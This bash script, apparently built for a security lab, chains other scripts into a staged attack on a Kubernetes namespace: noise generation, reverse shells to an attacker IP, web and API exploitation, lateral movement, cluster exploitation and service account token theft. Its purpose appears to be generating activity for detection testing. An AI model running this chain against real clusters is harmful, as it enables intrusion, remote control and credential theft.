#!/bin/bash

# Master script that runs all advanced attacks
# Generates maximum noise and activity

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"
ATTACKER_IP="${2:-}"
ATTACKER_PORT="${3:-4444}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              Master Advanced Attack Script                    ║"
echo "║                  (Lab Only)                                  ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

# Verify cluster access
if ! kubectl cluster-info > /dev/null 2>&1; then
    echo -e "${RED}Error: Cannot access cluster${NC}"
    exit 1
fi

echo -e "${YELLOW}Namespace: $NAMESPACE${NC}"
if [ -n "$ATTACKER_IP" ]; then
    echo -e "${YELLOW}Attacker IP: $ATTACKER_IP:$ATTACKER_PORT${NC}"
fi
echo ""

# 1. Generate basic noise
echo -e "${BLUE}[Phase 1] Generating Basic Noise...${NC}"
"$SCRIPT_DIR/generate-noise.sh" "$NAMESPACE" high

# 2. Advanced attacks
echo -e "\n${BLUE}[Phase 2] Executing Advanced Attacks...${NC}"
"$SCRIPT_DIR/advanced-attacks.sh" "$NAMESPACE"

# 3. Establish reverse shells if IP provided
if [ -n "$ATTACKER_IP" ]; then
    echo -e "\n${BLUE}[Phase 3] Establishing Reverse Shells...${NC}"
    "$SCRIPT_DIR/reverse-shell-persistent.sh" "$NAMESPACE" "$ATTACKER_IP" "$ATTACKER_PORT" all
fi

# 4. Exploit application vulnerabilities
echo -e "\n${BLUE}[Phase 4] Exploiting Application Vulnerabilities...${NC}"

# Set up temporary port-forwards
kubectl port-forward -n "$NAMESPACE" svc/vulnerable-web-app 3000:3000 > /dev/null 2>&1 &
PF_WEB=$!
sleep 2

kubectl port-forward -n "$NAMESPACE" svc/vulnerable-api 5000:5000 > /dev/null 2>&1 &
PF_API=$!
sleep 2

# Exploit applications
if [ -n "$PF_WEB" ]; then
    "$SCRIPT_DIR/exploit-web-app.sh" http://localhost:3000 2>/dev/null || true
fi

if [ -n "$PF_API" ]; then
    "$SCRIPT_DIR/exploit-api.sh" http://localhost:5000 2>/dev/null || true
fi

# Clean up port-forwards
kill $PF_WEB $PF_API 2>/dev/null || true

# 5. Lateral movement
echo -e "\n${BLUE}[Phase 5] Lateral Movement...${NC}"
"$SCRIPT_DIR/lateral-movement.sh" 2>/dev/null || true

# 6. Exploit Kubernetes
echo -e "\n${BLUE}[Phase 6] Exploiting Kubernetes...${NC}"
"$SCRIPT_DIR/exploit-k8s.sh" "$NAMESPACE" 2>/dev/null || true

# 7. Steal tokens
echo -e "\n${BLUE}[Phase 7] Stealing Service Account Tokens...${NC}"
PODS=$(kubectl get pods -n "$NAMESPACE" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null || echo "")
if [ -n "$PODS" ]; then
    FIRST_POD=$(echo $PODS | cut -d' ' -f1)
    "$SCRIPT_DIR/steal-service-account-token.sh" "$NAMESPACE" "$FIRST_POD" 2>/dev/null || true
fi

echo -e "\n${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║           All Attacks Have Been Executed                      ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"

echo -e "\n${YELLOW}Activity summary:${NC}"
echo -e "  ✓ Basic noise generated"
echo -e "  ✓ Advanced attacks executed"
if [ -n "$ATTACKER_IP" ]; then
    echo -e "  ✓ Reverse shells established"
fi
echo -e "  ✓ Vulnerabilities exploited"
echo -e "  ✓ Lateral movement performed"
echo -e "  ✓ Kubernetes exploited"
echo -e "  ✓ Tokens stolen"

echo -e "\n${YELLOW}To verify generated noise:${NC}"
echo -e "  ${GREEN}kubectl top pods -n $NAMESPACE${NC}"
echo -e "  ${GREEN}kubectl get events -n $NAMESPACE --sort-by='.lastTimestamp'${NC}"
